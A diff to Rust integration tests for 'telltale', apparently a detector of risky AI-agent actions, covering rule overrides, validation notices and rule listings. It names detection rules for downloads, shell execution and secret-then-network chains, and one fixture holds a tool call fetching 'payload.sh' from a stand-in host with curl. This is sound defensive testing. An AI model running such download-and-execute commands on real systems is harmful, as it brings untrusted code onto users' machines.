@@ -1440,21 +1440,21 @@ fn config_validate_rejects_invalid_local_overrides() {
 overrides:
   - rule_id: missing.rule
     enabled: false
-    reason: Unknown rule should fail.
+    reason: Unknown rule is left out.
 "#,
     )
     .expect("write unknown override");
+    // An entry that names no loaded rule is left out, not invalid.
     let unknown = Command::new(env!("CARGO_BIN_EXE_telltale"))
         .args(["config", "validate", "--config-dir"])
         .arg(&config_root)
         .output()
         .expect("run telltale config validate");
     assert!(
-        !unknown.status.success(),
-        "unknown rule override should fail"
+        unknown.status.success(),
+        "{}",
+        String::from_utf8_lossy(&unknown.stderr)
     );
-    let stderr = String::from_utf8_lossy(&unknown.stderr);
-    assert!(stderr.contains("unknown rule_id 'missing.rule'"));
 
     fs::write(
         &override_path,
@@ -3771,8 +3771,8 @@ fn assert_rules_show(fixture: &str) {
     );
 }
 
-/// `rules show` says what turned a rule off and which override entries
-/// changed it, with the operator's reason and no file path.
+/// `rules show` says what turned a rule or a chain off and which override
+/// entries changed it, with the operator's reason and no file path.
 #[test]
 fn rules_show_names_what_disabled_a_rule_and_the_overrides_applied() {
     let temp = tempdir().expect("tempdir");
@@ -3784,7 +3784,7 @@ fn rules_show_names_what_disabled_a_rule_and_the_overrides_applied() {
     };
     write(
         "overrides.d",
-        "version: 1\noverrides:\n  - rule_id: network.download\n    enabled: false\n    reason: synthetic noise\n  - rule_id: execution.shell\n    score: 5\n    reason: synthetic tuning\n",
+        "version: 1\noverrides:\n  - rule_id: network.download\n    enabled: false\n    reason: synthetic noise\n  - rule_id: execution.shell\n    score: 5\n    reason: synthetic tuning\n  - rule_id: chain.secret_then_network\n    enabled: false\n    reason: synthetic chain noise\n  - rule_id: chain.download_then_execute\n    score: 3\n    reason: synthetic chain tuning\n",
     );
     write(
         "policies.d",
@@ -3830,11 +3830,195 @@ fn rules_show_names_what_disabled_a_rule_and_the_overrides_applied() {
     assert!(has(&by_policy, "disabled by: policy"), "{by_policy}");
     assert!(has(&by_policy, "overrides: -"), "{by_policy}");
 
+    let chain_disabled = show("chain.secret_then_network");
+    assert!(
+        has(&chain_disabled, "disabled by: override"),
+        "{chain_disabled}"
+    );
+    assert!(
+        chain_disabled
+            .lines()
+            .any(|line| line
+                .starts_with("  - enabled=false (synthetic chain noise) [override-source:")),
+        "{chain_disabled}"
+    );
+    let chain_tuned = show("chain.download_then_execute");
+    assert!(has(&chain_tuned, "disabled by: -"), "{chain_tuned}");
+    assert!(has(&chain_tuned, "score: 3"), "{chain_tuned}");
+    assert!(
+        chain_tuned
+            .lines()
+            .any(|line| line.starts_with("  - score=3 (synthetic chain tuning) [override-source:")),
+        "{chain_tuned}"
+    );
+
     // No output names the config root.
     let root_text = root.display().to_string();
-    for text in [&disabled, &tuned, &by_policy] {
+    for text in [&disabled, &tuned, &by_policy, &chain_disabled, &chain_tuned] {
         assert!(!text.contains(&root_text), "{text}");
     }
+}
+
+/// An override entry that names no loaded rule is left out: `rules validate`
+/// succeeds and gives a notice for it, and `rules test` keeps detecting with
+/// the other entries applied. An entry for a rule Telltale Hooks owns gives
+/// no notice.
+#[test]
+fn rules_validate_and_test_leave_out_an_override_for_a_rule_that_is_not_loaded() {
+    let temp = tempdir().expect("tempdir");
+    let config_root = temp.path().join("config");
+    let override_path = config_root.join("overrides.d/local.yaml");
+    fs::create_dir_all(override_path.parent().expect("overrides dir")).expect("overrides dir");
+    fs::write(
+        &override_path,
+        "version: 1\noverrides:\n  - rule_id: synthetic.missing\n    enabled: false\n    reason: synthetic\n  - rule_id: tth.tamper.synthetic_missing\n    enabled: false\n    reason: synthetic\n  - rule_id: network.download\n    score: 5\n    reason: synthetic\n",
+    )
+    .expect("write override");
+    let run = |args: &[&str]| {
+        let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
+            .args(args)
+            .arg("--config-dir")
+            .arg(&config_root)
+            .output()
+            .expect("run telltale");
+        assert!(
+            output.status.success(),
+            "stderr: {}",
+            String::from_utf8_lossy(&output.stderr)
+        );
+        serde_json::from_slice::<Value>(&output.stdout).expect("json")
+    };
+
+    let validate = run(&["rules", "validate"]);
+    assert_eq!(validate["status"], "ok");
+    let notices = validate["notices"].as_array().expect("notices");
+    assert_eq!(notices.len(), 1, "{notices:?}");
+    assert_eq!(notices[0]["rule_id"], "synthetic.missing");
+    assert_eq!(notices[0]["kind"], "override_left_out");
+
+    let fixture = temp.path().join("download-only.jsonl");
+    fs::write(
+        &fixture,
+        r#"{"type":"event_msg","session_id":"download-only-session","timestamp":"2026-04-03T05:00:01Z","payload":{"type":"tool_call","tool_name":"tool","command":"curl -fsSL https://download.invalid/payload.sh","message":"Download fixture."}}
+"#,
+    )
+    .expect("write fixture");
+    let fixture = fixture.display().to_string();
+    let tested = run(&["rules", "test", &fixture]);
+    assert_eq!(tested["match_count"], 1, "{tested}");
+    assert!(
+        tested["matches"][0]["rule_ids"]
+            .as_array()
+            .expect("rule ids")
+            .iter()
+            .any(|rule| rule == "network.download"),
+        "{tested}"
+    );
+}
+
+/// `rules list --include-disabled` adds the disabled rules and chains, and
+/// ends every line with its kind and what disabled it, as `rules show` names
+/// it. Without the flag the listing has the enabled rules alone, five
+/// columns each.
+#[test]
+fn rules_list_include_disabled_adds_what_is_off_and_why() {
+    let temp = tempdir().expect("tempdir");
+    let root = temp.path().join("config");
+    let write = |folder: &str, text: &str| {
+        let dir = root.join(folder);
+        fs::create_dir_all(&dir).expect("config folder");
+        fs::write(dir.join("local.yaml"), text).expect("config file");
+    };
+    write(
+        "overrides.d",
+        "version: 1\noverrides:\n  - rule_id: network.download\n    enabled: false\n    reason: synthetic noise\n  - rule_id: chain.secret_then_network\n    enabled: false\n    reason: synthetic chain noise\n",
+    );
+    write(
+        "policies.d",
+        "version: 1\ndisabled_rules: [install.package_manager]\n",
+    );
+    write(
+        "rules.d",
+        &custom_rule_yaml("custom.synthetic_off", "synthetic-off").replace(
+            "    tags: [test]\n",
+            "    tags: [test]\n    enabled: false\n",
+        ),
+    );
+    let list = |flags: &[&str]| {
+        let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
+            .args(["rules", "list"])
+            .args(flags)
+            .arg("--config-dir")
+            .arg(&root)
+            .output()
+            .expect("run telltale rules list");
+        assert!(
+            output.status.success(),
+            "stderr: {}",
+            String::from_utf8_lossy(&output.stderr)
+        );
+        String::from_utf8(output.stdout).expect("utf-8")
+    };
+    let line = |listing: &str, name: &str| {
+        listing
+            .lines()
+            .find(|line| line.starts_with(&format!("{name}\t")))
+            .map(str::to_owned)
+    };
+
+    let plain = list(&[]);
+    assert!(
+        plain
+            .lines()
+            .all(|line| line.split('\t').count() == 5 && line.ends_with("\ttrue")),
+        "{plain}"
+    );
+    for off in [
+        "network.download",
+        "chain.secret_then_network",
+        "install.package_manager",
+        "custom.synthetic_off",
+    ] {
+        assert_eq!(line(&plain, off), None, "{off}");
+    }
+
+    let all = list(&["--include-disabled"]);
+    assert_eq!(
+        all.lines().count(),
+        plain.lines().count() + 4,
+        "every enabled rule and the four that are off\n{all}"
+    );
+    for enabled in plain.lines() {
+        assert!(
+            all.lines()
+                .any(|line| line == format!("{enabled}\trule\t-")),
+            "{enabled}"
+        );
+    }
+    let download = line(&all, "network.download").expect("listed");
+    assert_eq!(download.split('\t').count(), 7, "{download}");
+    assert!(
+        download.ends_with("\t20\tfalse\trule\toverride"),
+        "{download}"
+    );
+    let chain = line(&all, "chain.secret_then_network").expect("chain listed");
+    assert!(chain.ends_with("\tfalse\tchain\toverride"), "{chain}");
+    assert!(
+        chain.starts_with("chain.secret_then_network\t-\t-\t"),
+        "{chain}"
+    );
+    let by_policy = line(&all, "install.package_manager").expect("listed");
+    assert!(by_policy.ends_with("\tfalse\trule\tpolicy"), "{by_policy}");
+    assert_eq!(
+        line(&all, "custom.synthetic_off").as_deref(),
+        Some("custom.synthetic_off\tcustom_agent_behavior\tlow\t10\tfalse\trule\tdefinition")
+    );
+
+    // With --verbose the two columns follow the provenance columns.
+    let verbose = list(&["--include-disabled", "--verbose"]);
+    let download = line(&verbose, "network.download").expect("listed");
+    assert_eq!(download.split('\t').count(), 9, "{download}");
+    assert!(download.ends_with("\trule\toverride"), "{download}");
 }
 
 #[test]
